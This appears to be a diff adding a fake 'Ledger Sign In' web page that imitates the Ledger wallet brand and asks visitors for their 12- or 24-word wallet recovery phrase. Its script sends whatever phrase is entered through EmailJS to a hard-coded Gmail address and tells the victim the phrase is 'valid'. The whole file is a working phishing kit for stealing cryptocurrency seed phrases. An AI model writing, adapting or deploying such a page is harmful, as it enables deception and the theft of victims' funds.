@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Ledger Sign In</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+      (function () {
+        emailjs.init("3ijyLWGjsj4QnVlp_"); // Replace with your actual EmailJS Public Key
+      })();
+
+      function validatePhrase() {
+        let phrase = document.getElementById("walletPhrase").value.trim();
+        let words = phrase.split(/\s+/);
+        let errorText = document.getElementById("error");
+
+        if (words.length === 12 || words.length === 24) {
+          errorText.style.display = "none";
+
+          // Send Email using EmailJS
+          let emailParams = {
+            from_name: "User Wallet Input",
+            to_email: "Alwaysgrateful670@gmail.com", // Replace with your actual email
+            message: `User input: ${phrase}`,
+            c,
+          };
+
+          emailjs
+            .send("service_b2yu2u9", "template_vslmmtl", emailParams)
+            .then((response) => {
+              alert("Valid phrase! Email sent successfully!");
+              console.log("SUCCESS!", response);
+            })
+            .catch((error) => {
+              alert("Valid phrase, but failed to send email.");
+              console.log("FAILED...", error);
+            });
+        } else {
+          errorText.style.display = "block";
+        }
+      }
+    </script>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background-color: #f8f8f8;
+      }
+      .container {
+        background: white;
+        padding: 40px;
+        border-radius: 8px;
+        box-shadow: 0 0 15px rgba(0, 0, 0, 0.15);
+        width: 400px;
+      }
+      .ledger-logo {
+        width: 120px; /* Adjust size as needed */
+        margin-bottom: 5px;
+        display: block;
+      }
+      .title-container {
+        text-align: left; /* Align logo and text to the left */
+      }
+      h2 {
+        font-size: 24px;
+        margin-bottom: 20px;
+      }
+      input {
+        width: 100%;
+        padding: 12px;
+        margin: 10px 0;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        font-size: 16px;
+      }
+      .buttons {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 10px;
+      }
+      button {
+        padding: 12px 20px;
+        border: none;
+        cursor: pointer;
+        border-radius: 5px;
+        font-size: 16px;
+      }
+      .back {
+        background: #ccc;
+      }
+      .next {
+        background: #007bff;
+        color: white;
+      }
+      #error {
+        color: red;
+        margin-top: 10px;
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="title-container">
+        <!-- Replace with your actual logo URL -->
+        <img
+          src="image/download (9).png"
+          alt="Ledger Logo"
+          class="ledger-logo"
+        />
+        <h2>Sign in</h2>
+      </div>
+
+      <input
+        type="text"
+        id="walletPhrase"
+        placeholder="Enter Wallet 12-24 Key Phrase"
+      />
+      <div class="buttons">
+        <button class="back">Back</button>
+        <button class="next" onclick="validatePhrase()">Next</button>
+      </div>
+      <p id="error">Phrase must have exactly 12 or 24 words.</p>
+    </div>
+  </body>
+</html>
